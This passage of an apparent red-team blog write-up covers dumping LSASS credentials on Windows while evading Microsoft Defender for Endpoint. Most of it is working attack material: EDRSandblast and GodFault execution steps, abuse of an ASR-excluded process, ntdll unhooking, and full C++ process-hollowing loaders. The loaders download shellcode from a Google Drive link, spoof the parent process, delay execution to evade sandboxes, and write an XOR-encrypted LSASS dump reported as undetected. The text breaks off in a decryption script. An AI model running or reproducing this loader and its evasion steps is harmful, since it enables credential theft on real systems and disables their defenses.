000000E0   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
000000F0   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
```

Analysing the God Fault exploit we find it is undetected:

```
PS D:\> .\ThreatCheck.exe -f D:\Tools\GodFault.exe
[+] No threat found!
```

Now on a Ubuntu Machine / WSL use ExtractOffsets.py to get offsets for the target ntoskrnl / wdigest binary versions. To do so run `ver / winver` to retrieve the OS build version on your target and then download appropriate ntoskrnl / wdigest specific versions from: https://winbindex.m417z.com/ to extract offsets as follows.

```
m3rcer@GHOUL:/mnt/d/Work/BypassMDE/Tools/EDRSandblast-GodFault-main/Offsets$ sudo dpkg -i radare2_5.8.8_amd64.deb
Selecting previously unselected package radare2.
(Reading database ... 183535 files and directories currently installed.)
Preparing to unpack radare2_5.8.8_amd64.deb ...
Unpacking radare2 (5.8.8) ...
Setting up radare2 (5.8.8) ...
Processing triggers for man-db (2.10.2-1) ...

m3rcer@GHOUL:/mnt/d/Work/BypassMDE/Tools/EDRSandblast-GodFault-main/Offsets$ python3 ExtractOffsets.py -i ntoskrnl.exe ntoskrnl
[*] Processing ntoskrnl version ntoskrnl_22621-2134.exe (file: ./ntoskrnl.exe)
[+] Finished processing of ntoskrnl ./ntoskrnl.exe!

m3rcer@GHOUL:/mnt/d/Work/BypassMDE/Tools/EDRSandblast-GodFault-main/Offsets$ python3 ExtractOffsets.py -i wdigest.exe wdigest
[*] Processing ntoskrnl version wdigest_22621-2134.exe (file: ./wdigest.exe)
[+] Finished processing of wdigest ./wdigest.exe!
```

Next compile the EDRSandblast-GodFault in Visual Studio and transfer the compiled EDRSandblast.exe binary along with GodFault.exe and the above compiled  ntoskrnl_22621-2134.exe and wdigest_22621-2134.exe. 

Execute this as follows:

```
C:\Users\user\Desktop\Offsets>EDRSandblast.exe --kernelmode dump --usermode
```

We find an informational alert on MDE: 

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230915172017.png)

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230915172038.png)

From ThreatCheck we had found that the offset for detection was at: `0x501FD`. Using Ghidra and analysing the binary at that offset we find a function:

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230901175843.png)

*WIP: Need to locate this function in src and replace to remove detection*

<div style="page-break-after: always;"></div>

----

# Using Process Injection

## Process Injection in a ASR excluded process using an Unhooked ntdll - Blindside

Since MDE has major detections around getting a handle to LSASS, the MiniDumpWrite API etc, is there any way to use these and still remain undetected? The answer is yes if you decide to perform execution in the blindspots of MDE. MDE heavily relies on ASR rules for detection. 

To perform a successfull LSASS dmp using the standard MiniDumpWrite API (and by getting a handle to the LSASS process) technique we can chose to perform this execution from an ASR excluded process. We can use ASR .LUA rules to find blindspots in to perform trusted execution. 

Here is the ASR rule for "Blocking Credential Stealing from LSASS": https://github.com/HackingLZ/ExtractedDefender/blob/main/asr/9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2

We can perform execution (using MiniDumpWrite API) in a trusted excluded process such as `mrt.exe` to operate in the blindspots and avoid detection from this ASR rule.

```
GetPathExclusions = function()
  -- function num : 0_2
  local l_3_0 = {}
  l_3_0["%windir%\\system32\\WerFaultSecure.exe"] = 2
  l_3_0["%windir%\\system32\\mrt.exe"] = 2
  [...snip...]
```

[Blindside](https://github.com/CymulateResearch/Blindside/tree/main) works by first spawning a debug process, then creates a breakpoint handler and sets a hardware breakpoint that will force the debugged process to load only a fresh copy of ntdll to memory. This will result in a clean and unhooked ntdll which could then be used to perform process injection using NtAPIs.

Compiling and analysing the POC after we find that there are no detections.

```
PS D:\> .\ThreatCheck.exe -f D:\Work\Blindside.exe
[+] No threat found!
```

Testing the POC against MDE too we find that we have no detections and that ntdll is succesfully unhooked:

```
C:\Users\administrator1\Desktop>.\Blindside.exe
[+] Creating new process in debug mode
[+] Found LdrLoadDllAddress address: 0x00007FFC875DAE00
[+] Setting HWBP on remote process
[+] Breakpoint Hit!
[+] Copying clean ntdll from remote process
[+] Found ntdll base address: 0x00007FFC875A0000
[+] Unhooked
```

Now, using the unhooked ntdll it is possible to add Process Injection functionality.

In this case we use Process Hollowing using a few replaced NtAPIs. We serve our shellcode which is compiled from this blog (Uses standard MiniDumpWriteAPI with and encrypted dump): https://dec0ne.github.io/research/2022-11-14-Undetected-Lsass-Dump-Workflow/ and convert it shellcode using [pe2sh](https://github.com/hasherezade/pe_to_shellcode). 

Convert DLL to shellcode and test:

```
PS D:\Work\pe2sh> .\pe2shc.exe .\DLLHijackLSASSDump.dll DLLHijackLSASSDump.bin
Using: Loader v2
Reading module from: .\DLLHijackLSASSDump.dll
[INFO] This is a console application.
[INFO] Saved as: DLLHijackLSASSDump.bin

PS D:\Work\pe2sh> .\runshc64.exe .\DLLHijackLSASSDump.bin
[*] Reading module from: .\DLLHijackLSASSDump.bin
>>> Creating a new thread...
[*] Running the shellcode [1bb11230000 - 1bb11239600]
[+] Searching for LSASS PID
[+] LSASS PID: 1436
[+] Starting dump to memory buffer
[+] Copied 71065441 bytes to memory buffer
[+] Dump3d LS@SS!
[+] Xor encrypting the memory buffer containing the dump data
[+] Xor key: jisjidpa123
[+] Enrypted dump data written to "LSASS_ENCRYPTED.DMP" file
[*] Running again to unload the DLL...
[*] Load status: 2
[+] The shellcode finished with a return value: 1
>>> FINISHED.
```

Once done we serve the shellcode from google drive.

*Note: Adding NtAPI header definitions hasn't been shown here.*

```
int main()
{
    // create startup info struct
    LPSTARTUPINFOW startup_info = new STARTUPINFOW();
    startup_info->cb = sizeof(STARTUPINFOW);
    startup_info->dwFlags = STARTF_USESHOWWINDOW;

    // create process info struct
    PPROCESS_INFORMATION process_info = new PROCESS_INFORMATION();

    // null terminated command line
    wchar_t cmd[] = L"notepad.exe\0";

    // create process
    BOOL success = CreateProcess(
        NULL,
        cmd,
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW | CREATE_SUSPENDED,
        NULL,
        NULL,
        startup_info,
        process_info);

    // download shellcode
	std::vector<BYTE> shellcode = Download(L"www.drive.google.com\0", L"/u/5/uc?id=1WUDbPX-v47lxMcE0e9K_Uqk6G83AZa5_&export=download\0");

    // find Nt APIs
    // HMODULE hNtdll is the handle to Unhooked ntdll
    NtCreateSection ntCreateSection = (NtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    NtMapViewOfSection ntMapViewOfSection = (NtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
    NtUnmapViewOfSection ntUnmapViewOfSection = (NtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");

    // create section in local process
    HANDLE hSection;
    LARGE_INTEGER szSection = { shellcode.size() };

    NTSTATUS status = ntCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,
        &szSection,
        PAGE_EXECUTE_READWRITE,
        SEC_COMMIT,
        NULL);

    // map section into memory of local process
    PVOID hLocalAddress = NULL;
    SIZE_T viewSize = 0;

    status = ntMapViewOfSection(
        hSection,
        GetCurrentProcess(),
        &hLocalAddress,
        NULL,
        NULL,
        NULL,
        &viewSize,
        ViewShare,
        NULL,
        PAGE_EXECUTE_READWRITE);

    // copy shellcode into local memory
    RtlCopyMemory(hLocalAddress, &shellcode[0], shellcode.size());

    // map section into memory of remote process
    PVOID hRemoteAddress = NULL;

    status = ntMapViewOfSection(
        hSection,
        process_info->hProcess,
        &hRemoteAddress,
        NULL,
        NULL,
        NULL,
        &viewSize,
        ViewShare,
        NULL,
        PAGE_EXECUTE_READWRITE);

    // get context of main thread
    LPCONTEXT pContext = new CONTEXT();
    pContext->ContextFlags = CONTEXT_INTEGER;
    GetThreadContext(process_info->hThread, pContext);

    // update rcx context
    pContext->Rcx = (DWORD64)hRemoteAddress;
    SetThreadContext(process_info->hThread, pContext);

    // resume thread
    ResumeThread(process_info->hThread);

    // unmap memory from local process
    status = ntUnmapViewOfSection(
        GetCurrentProcess(),
        hLocalAddress);
}
```

Testing agaist MDE we find the following alerts:

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230915184322.png)

We find that Process Hollowing was detected. 

Now we can attempt replacing all remaining APIs to their NtAPI  equivalents. `NtCreateUserProcess` can be a little tricky to replace. Here is a blog showcasing how to do it: https://captmeelo.com/redteam/maldev/2022/05/10/ntcreateuserprocess.html

The source would look something like this: 

```
int main(int argc, char* argv[])
{
	[....snip....]

	size_t NtdllBAddress = reinterpret_cast<size_t>(hNtdll);
	printf("[+] Found ntdll base address: 0x%p\n", NtdllBAddress);
	int NtdllResult = CopyDLLFromDebugProcess(process.hProcess, NtdllBAddress, stealth);
	if (NtdllResult == 0)
	{
		printf("[+] Unhooked\n");
	}
	else
	{
		printf("[-] Failed to unhook\n");
	}

	// Get NtAPIs from clean NtDLL
	NtCreateSection ntCreateSection = (NtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
	NtMapViewOfSection ntMapViewOfSection = (NtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
	//NtUnmapViewOfSection ntUnmapViewOfSection = (NtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
	NtCreateUserProcess ntCreateUserProcess = (NtCreateUserProcess)GetProcAddress(hNtdll, "NtCreateUserProcess");
	NtResumeProcess ntResumeProcess = (NtResumeProcess)GetProcAddress(hNtdll, "NtResumeProcess");
	NtResumeThread ntResumeThread = (NtResumeThread)GetProcAddress(hNtdll, "NtResumeThread");
	NtSetContextThread ntSetContextThread = (NtSetContextThread)GetProcAddress(hNtdll, "NtSetContextThread");
	NtGetContextThread ntGetContextThread = (NtGetContextThread)GetProcAddress(hNtdll, "NtGetContextThread");
	NtDelayExecution ntDelayExecution = (NtDelayExecution)GetProcAddress(hNtdll, "NtDelayExecution");

	/* LOADER */

	// Path to the image file from which the process will be created
	UNICODE_STRING NtImagePath, Params, ImagePath;
	RtlInitUnicodeString(&ImagePath, (PWSTR)L"C:\\Windows\\System32\\mrt.exe");

	RtlInitUnicodeString(&NtImagePath, (PWSTR)L"\\??\\C:\\Windows\\System32\\mrt.exe");
	RtlInitUnicodeString(&Params, (PWSTR)L"\"C:\\WINDOWS\\SYSTEM32\\mrt.exe\" /i EDR_murda!");
	// Create the process parameters
	PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL;
	RtlCreateProcessParametersEx(&ProcessParameters, &ImagePath, NULL, NULL, &Params, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROCESS_PARAMETERS_NORMALIZED);

	// Initialize the PS_CREATE_INFO structure
	PS_CREATE_INFO CreateInfo = { 0 };
	CreateInfo.Size = sizeof(CreateInfo);
	CreateInfo.State = PsCreateInitialState;

	//Skip Image File Execution Options debugger
	CreateInfo.InitState.u1.InitFlags = PsSkipIFEODebugger;

	OBJECT_ATTRIBUTES objAttr = { sizeof(OBJECT_ATTRIBUTES)};
	PPS_STD_HANDLE_INFO stdHandleInfo = (PPS_STD_HANDLE_INFO)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_STD_HANDLE_INFO));
	PCLIENT_ID clientId = (PCLIENT_ID)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE));
	PSECTION_IMAGE_INFORMATION SecImgInfo = (PSECTION_IMAGE_INFORMATION)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(SECTION_IMAGE_INFORMATION));
	PPS_ATTRIBUTE_LIST AttributeList = (PS_ATTRIBUTE_LIST*)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE_LIST));

	// Create necessary attributes
	AttributeList->TotalLength = sizeof(PS_ATTRIBUTE_LIST);
	AttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_CLIENT_ID;
	AttributeList->Attributes[0].Size = sizeof(CLIENT_ID);
	AttributeList->Attributes[0].ValuePtr = clientId;

	AttributeList->Attributes[1].Attribute = PS_ATTRIBUTE_IMAGE_INFO;
	AttributeList->Attributes[1].Size = sizeof(SECTION_IMAGE_INFORMATION);
	AttributeList->Attributes[1].ValuePtr = SecImgInfo;

	AttributeList->Attributes[2].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
	AttributeList->Attributes[2].Size = NtImagePath.Length;
	AttributeList->Attributes[2].ValuePtr = NtImagePath.Buffer;

	AttributeList->Attributes[3].Attribute = PS_ATTRIBUTE_STD_HANDLE_INFO;
	AttributeList->Attributes[3].Size = sizeof(PS_STD_HANDLE_INFO);
	AttributeList->Attributes[3].ValuePtr = stdHandleInfo;

	DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;

	// Add process mitigation attribute
	AttributeList->Attributes[4].Attribute = PS_ATTRIBUTE_MITIGATION_OPTIONS;
	AttributeList->Attributes[4].Size = sizeof(DWORD64);
	AttributeList->Attributes[4].ValuePtr = &policy;

	// Spoof Parent Process Id as explorer.exe
	DWORD trayPID;
	HWND trayWnd = FindWindowW(L"Shell_TrayWnd", NULL);
	GetWindowThreadProcessId(trayWnd, &trayPID);
	HANDLE hParent = OpenProcess(PROCESS_ALL_ACCESS, false, trayPID);
	if (hParent)
	{
		AttributeList->Attributes[5].Attribute = PS_ATTRIBUTE_PARENT_PROCESS;
		AttributeList->Attributes[5].Size = sizeof(HANDLE);
		AttributeList->Attributes[5].ValuePtr = hParent;
	}
	else
	{
		AttributeList->TotalLength -= sizeof(PS_ATTRIBUTE);
	}
	

	/* Process Injection */

	// Create the process
	HANDLE ntHandle = NULL, ntThread = NULL;
	ntCreateUserProcess(&ntHandle, &ntThread, MAXIMUM_ALLOWED, MAXIMUM_ALLOWED, &objAttr, &objAttr, 0x00000200, 0x00000001, ProcessParameters, &CreateInfo, AttributeList);

	// download shellcode
	std::vector<BYTE> shellcode = Download(L"www.drive.google.com\0", L"/u/5/uc?id=1WUDbPX-v47lxMcE0e9K_Uqk6G83AZa5_&export=download\0");

	// create section in local process
	HANDLE localSection;
	LARGE_INTEGER localszSection = { shellcode.size() };

	NTSTATUS status = ntCreateSection(
		&localSection,
		SECTION_ALL_ACCESS,
		NULL,
		&localszSection,
		PAGE_EXECUTE_READWRITE,
		SEC_COMMIT,
		NULL);

	// map section into memory of local process
	PVOID hLocalAddress = NULL;
	SIZE_T viewSize = 0;

	status = ntMapViewOfSection(
		localSection,
		GetCurrentProcess(),
		&hLocalAddress,
		NULL,
		NULL,
		NULL,
		&viewSize,
		ViewShare,
		NULL,
		PAGE_EXECUTE_READWRITE);

	// copy shellcode into local memory
	RtlCopyMemory(hLocalAddress, &shellcode[0], shellcode.size());

	// map section into memory of remote process
	PVOID hRemoteAddress = NULL;

	status = ntMapViewOfSection(
		localSection,
		ntHandle,
		&hRemoteAddress,
		NULL,
		NULL,
		NULL,
		&viewSize,
		ViewShare,
		NULL,
		PAGE_EXECUTE_READWRITE);

	CONTEXT threadContext;
	threadContext.ContextFlags = CONTEXT_INTEGER;

	ntGetContextThread(ntThread, &threadContext);

	// Update RCX register in the context
	threadContext.Rcx = (DWORD64)hRemoteAddress;

	// Set the modified context back to the main thread
	ntSetContextThread(ntThread, &threadContext);

	// Resume the thread (you can use NtResumeThread if needed)
	ntResumeThread(ntThread, NULL);
	
	// unmap memory from local process
	status = ntUnmapViewOfSection(
	GetCurrentProcess(),
	hLocalAddress);

	// Clean up injected process
	if(hParent) CloseHandle(hParent);
	RtlFreeHeap(RtlProcessHeap(), 0, AttributeList);
	RtlFreeHeap(RtlProcessHeap(), 0, stdHandleInfo);
	RtlFreeHeap(RtlProcessHeap(), 0, clientId);
	RtlFreeHeap(RtlProcessHeap(), 0, SecImgInfo);
 	RtlDestroyProcessParameters(ProcessParameters);

	// Close Debug process
	CloseHandle(process.hProcess);
	TerminateProcess(process.hProcess, 0);
}
```

Executing against MDE we are still flagged:

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230915190703.png)

Even though we have injected in ASR excluded process we find that MDE has detected that it is still malicious.

We add a few more checks to get past MDE:

Timer execution to avoid Sandbox checks:

```
// Converting minutes to milliseconds
	float ftMinutes = 0.1;
	DWORD               dwMilliSeconds = ftMinutes * 60000;
	LARGE_INTEGER       DelayInterval = { 0 };
	LONGLONG            Delay = NULL;
	NTSTATUS            STATUS = NULL;
	DWORD               _T0 = NULL,
		_T1 = NULL;

	// Converting from milliseconds to the 100-nanosecond - negative time interval
	Delay = dwMilliSeconds * 10000;
	DelayInterval.QuadPart = -Delay;

	_T0 = GetTickCount64();

	// Sleeping for 'dwMilliSeconds' ms
	if ((STATUS = ntDelayExecution(FALSE, &DelayInterval)) != 0x00 && STATUS != STATUS_TIMEOUT) {
		printf("[!] NtDelayExecution Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	_T1 = GetTickCount64();

	// Slept for at least 'dwMilliSeconds' ms, then 'DelayExecutionVia_NtDE' succeeded, otherwize it failed
	if ((DWORD)(_T1 - _T0) < dwMilliSeconds)
		return FALSE;
```

And finally the Process Mitigation Policy to avoid non-Microsoft loads: 

```
DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;

	// Add process mitigation attribute
	AttributeList->Attributes[4].Attribute = PS_ATTRIBUTE_MITIGATION_OPTIONS;
	AttributeList->Attributes[4].Size = sizeof(DWORD64);
	AttributeList->Attributes[4].ValuePtr = &policy;
```

Unfortunately we are still detected.

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230915191541.png)

Recently, a lot of new Process Injection techniques have arised like [DllNotificationInjection](https://github.com/ShorSec/DllNotificationInjection/tree/master) and [ThreadlessInject](https://github.com/CCob/ThreadlessInject) to avoid the execution of the last few Process Injection APIs - `ResumeThread` etc. It is possible to replace this functionality, however for Process Hollowing the main detection arises from the `UnmapViewOfSection` API. 

Removing this we get past all detections. The finaly source looks something like this:

```
int main(int argc, char* argv[])
{
	BOOL stealth = FALSE;
	if (argc == 2)
	{
		if (strcmp(argv[1], "stealth") == 0) {
			printf("[+] Stealth mode: Unhooking one function\n");
			stealth = TRUE;
		}

	}

	printf("[+] Creating new process in debug mode\n");
	PROCESS_INFORMATION process = createProcessInDebug((wchar_t*)LR"(C:\Windows\System32\RuntimeBroker.exe)");
	HANDLE hThread = process.hThread;

	HMODULE hNtdll = GetModuleFromPEB(4097367);
	HMODULE hKernel_32 = GetModuleFromPEB(109513359);
	_LdrLoadDll LdrLoadDllCustom = (_LdrLoadDll)GetAPIFromPEBModule(hNtdll, 11529801);

	size_t LdrLoadDllAddress = reinterpret_cast<size_t>(LdrLoadDllCustom);
	printf("[+] Found LdrLoadDllAddress address: 0x%p\n", LdrLoadDllAddress);

	printf("[+] Setting HWBP on remote process\n");

	SetHWBP((DWORD_PTR)LdrLoadDllAddress, hThread);
	printf("[+] Copying clean ntdll from remote process\n");


	size_t NtdllBAddress = reinterpret_cast<size_t>(hNtdll);
	printf("[+] Found ntdll base address: 0x%p\n", NtdllBAddress);
	int NtdllResult = CopyDLLFromDebugProcess(process.hProcess, NtdllBAddress, stealth);
	if (NtdllResult == 0)
	{
		printf("[+] Unhooked\n");
	}
	else
	{
		printf("[-] Failed to unhook\n");
	}

	// Get NtAPIs from clean NtDLL
	NtCreateSection ntCreateSection = (NtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
	NtMapViewOfSection ntMapViewOfSection = (NtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
	//NtUnmapViewOfSection ntUnmapViewOfSection = (NtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
	NtCreateUserProcess ntCreateUserProcess = (NtCreateUserProcess)GetProcAddress(hNtdll, "NtCreateUserProcess");
	NtResumeProcess ntResumeProcess = (NtResumeProcess)GetProcAddress(hNtdll, "NtResumeProcess");
	NtResumeThread ntResumeThread = (NtResumeThread)GetProcAddress(hNtdll, "NtResumeThread");
	NtSetContextThread ntSetContextThread = (NtSetContextThread)GetProcAddress(hNtdll, "NtSetContextThread");
	NtGetContextThread ntGetContextThread = (NtGetContextThread)GetProcAddress(hNtdll, "NtGetContextThread");
	NtDelayExecution ntDelayExecution = (NtDelayExecution)GetProcAddress(hNtdll, "NtDelayExecution");

	/* Delay Execution */

	// Converting minutes to milliseconds
	float ftMinutes = 0.1;
	DWORD               dwMilliSeconds = ftMinutes * 60000;
	LARGE_INTEGER       DelayInterval = { 0 };
	LONGLONG            Delay = NULL;
	NTSTATUS            STATUS = NULL;
	DWORD               _T0 = NULL,
		_T1 = NULL;

	// Converting from milliseconds to the 100-nanosecond - negative time interval
	Delay = dwMilliSeconds * 10000;
	DelayInterval.QuadPart = -Delay;

	_T0 = GetTickCount64();

	// Sleeping for 'dwMilliSeconds' ms
	if ((STATUS = ntDelayExecution(FALSE, &DelayInterval)) != 0x00 && STATUS != STATUS_TIMEOUT) {
		printf("[!] NtDelayExecution Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	_T1 = GetTickCount64();

	// Slept for at least 'dwMilliSeconds' ms, then 'DelayExecutionVia_NtDE' succeeded, otherwize it failed
	if ((DWORD)(_T1 - _T0) < dwMilliSeconds)
		return FALSE;


	/* LOADER */

	// NtCreateProcess Definition

	// Path to the image file from which the process will be created
	UNICODE_STRING NtImagePath, Params, ImagePath;
	RtlInitUnicodeString(&ImagePath, (PWSTR)L"C:\\Windows\\System32\\mrt.exe");

	RtlInitUnicodeString(&NtImagePath, (PWSTR)L"\\??\\C:\\Windows\\System32\\mrt.exe");
	RtlInitUnicodeString(&Params, (PWSTR)L"\"C:\\WINDOWS\\SYSTEM32\\mrt.exe\" /i EDR_murda!");
	// Create the process parameters
	PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL;
	RtlCreateProcessParametersEx(&ProcessParameters, &ImagePath, NULL, NULL, &Params, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROCESS_PARAMETERS_NORMALIZED);

	// Initialize the PS_CREATE_INFO structure
	PS_CREATE_INFO CreateInfo = { 0 };
	CreateInfo.Size = sizeof(CreateInfo);
	CreateInfo.State = PsCreateInitialState;

	//Skip Image File Execution Options debugger
	CreateInfo.InitState.u1.InitFlags = PsSkipIFEODebugger;

	OBJECT_ATTRIBUTES objAttr = { sizeof(OBJECT_ATTRIBUTES)};
	PPS_STD_HANDLE_INFO stdHandleInfo = (PPS_STD_HANDLE_INFO)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_STD_HANDLE_INFO));
	PCLIENT_ID clientId = (PCLIENT_ID)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE));
	PSECTION_IMAGE_INFORMATION SecImgInfo = (PSECTION_IMAGE_INFORMATION)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(SECTION_IMAGE_INFORMATION));
	PPS_ATTRIBUTE_LIST AttributeList = (PS_ATTRIBUTE_LIST*)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE_LIST));

	// Create necessary attributes
	AttributeList->TotalLength = sizeof(PS_ATTRIBUTE_LIST);
	AttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_CLIENT_ID;
	AttributeList->Attributes[0].Size = sizeof(CLIENT_ID);
	AttributeList->Attributes[0].ValuePtr = clientId;

	AttributeList->Attributes[1].Attribute = PS_ATTRIBUTE_IMAGE_INFO;
	AttributeList->Attributes[1].Size = sizeof(SECTION_IMAGE_INFORMATION);
	AttributeList->Attributes[1].ValuePtr = SecImgInfo;

	AttributeList->Attributes[2].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
	AttributeList->Attributes[2].Size = NtImagePath.Length;
	AttributeList->Attributes[2].ValuePtr = NtImagePath.Buffer;

	AttributeList->Attributes[3].Attribute = PS_ATTRIBUTE_STD_HANDLE_INFO;
	AttributeList->Attributes[3].Size = sizeof(PS_STD_HANDLE_INFO);
	AttributeList->Attributes[3].ValuePtr = stdHandleInfo;

	DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;

	// Add process mitigation attribute
	AttributeList->Attributes[4].Attribute = PS_ATTRIBUTE_MITIGATION_OPTIONS;
	AttributeList->Attributes[4].Size = sizeof(DWORD64);
	AttributeList->Attributes[4].ValuePtr = &policy;

	// Spoof Parent Process Id as explorer.exe
	DWORD trayPID;
	HWND trayWnd = FindWindowW(L"Shell_TrayWnd", NULL);
	GetWindowThreadProcessId(trayWnd, &trayPID);
	HANDLE hParent = OpenProcess(PROCESS_ALL_ACCESS, false, trayPID);
	if (hParent)
	{
		AttributeList->Attributes[5].Attribute = PS_ATTRIBUTE_PARENT_PROCESS;
		AttributeList->Attributes[5].Size = sizeof(HANDLE);
		AttributeList->Attributes[5].ValuePtr = hParent;
	}
	else
	{
		AttributeList->TotalLength -= sizeof(PS_ATTRIBUTE);
	}
	
	/* Process Injection */

	// Create the process
	HANDLE ntHandle = NULL, ntThread = NULL;
	ntCreateUserProcess(&ntHandle, &ntThread, MAXIMUM_ALLOWED, MAXIMUM_ALLOWED, &objAttr, &objAttr, 0x00000200, 0x00000001, ProcessParameters, &CreateInfo, AttributeList);

	// download shellcode
	std::vector<BYTE> shellcode = Download(L"www.drive.google.com\0", L"/u/5/uc?id=1WUDbPX-v47lxMcE0e9K_Uqk6G83AZa5_&export=download\0");

	// create section in local process
	HANDLE localSection;
	LARGE_INTEGER localszSection = { shellcode.size() };

	NTSTATUS status = ntCreateSection(
		&localSection,
		SECTION_ALL_ACCESS,
		NULL,
		&localszSection,
		PAGE_EXECUTE_READWRITE,
		SEC_COMMIT,
		NULL);

	// map section into memory of local process
	PVOID hLocalAddress = NULL;
	SIZE_T viewSize = 0;

	status = ntMapViewOfSection(
		localSection,
		GetCurrentProcess(),
		&hLocalAddress,
		NULL,
		NULL,
		NULL,
		&viewSize,
		ViewShare,
		NULL,
		PAGE_EXECUTE_READWRITE);

	// copy shellcode into local memory
	RtlCopyMemory(hLocalAddress, &shellcode[0], shellcode.size());

	// map section into memory of remote process
	PVOID hRemoteAddress = NULL;

	status = ntMapViewOfSection(
		localSection,
		ntHandle,
		&hRemoteAddress,
		NULL,
		NULL,
		NULL,
		&viewSize,
		ViewShare,
		NULL,
		PAGE_EXECUTE_READWRITE);

	CONTEXT threadContext;
	threadContext.ContextFlags = CONTEXT_INTEGER;

	ntGetContextThread(ntThread, &threadContext);

	// Update RCX register in the context
	threadContext.Rcx = (DWORD64)hRemoteAddress;

	// Set the modified context back to the main thread
	ntSetContextThread(ntThread, &threadContext);

	// Resume the thread (you can use NtResumeThread if needed)
	ntResumeThread(ntThread, NULL);
	
	// Clean up injected process
	if(hParent) CloseHandle(hParent);
	RtlFreeHeap(RtlProcessHeap(), 0, AttributeList);
	RtlFreeHeap(RtlProcessHeap(), 0, stdHandleInfo);
	RtlFreeHeap(RtlProcessHeap(), 0, clientId);
	RtlFreeHeap(RtlProcessHeap(), 0, SecImgInfo);
 	RtlDestroyProcessParameters(ProcessParameters);

	// Close Debug process
	CloseHandle(process.hProcess);
	TerminateProcess(process.hProcess, 0);
}
```

Upon testing execution Microsoft asks to send this file for submission, please deny this.

```
C:\Users\administrator1\Desktop>.\NtCreateUserProcess.exe
[+] Creating new process in debug mode
[+] Found LdrLoadDllAddress address: 0x00007FFC875DAE00
[+] Setting HWBP on remote process
[+] Breakpoint Hit!
[+] Copying clean ntdll from remote process
[+] Found ntdll base address: 0x00007FFC875A0000
[+] Unhooked

C:\Users\administrator1\Desktop>dir
 Volume in drive C is Windows
 Volume Serial Number is 98FF-9D7F

 Directory of C:\Users\administrator1\Desktop

09/13/2023  11:49 AM    <DIR>          .
09/13/2023  10:10 AM    <DIR>          ..
09/13/2023  11:49 AM        48,420,362 LSASS_ENCRYPTED.DMP
09/13/2023  10:29 AM            22,016 NtCreateUserProcess.exe
09/12/2023  10:47 AM        25,355,496 VC_redist.x64.exe
               3 File(s)     73,797,874 bytes
               2 Dir(s)  116,271,603,712 bytes free
```


![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230913171829.png)

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230913171912.png)

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230913171952.png)

Noting for any alerts, no new alerts are found:

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230823180840.png)

Finally retrieve and decrypt the LSASS dump using this python script.

```
# author: reenz0h (twitter: @sektor7net)

import sys
from itertools import cycle

key = bytearray("jisjidpa123","utf8")
filename = "LSASS_DECRYPTED.DMP"

try:
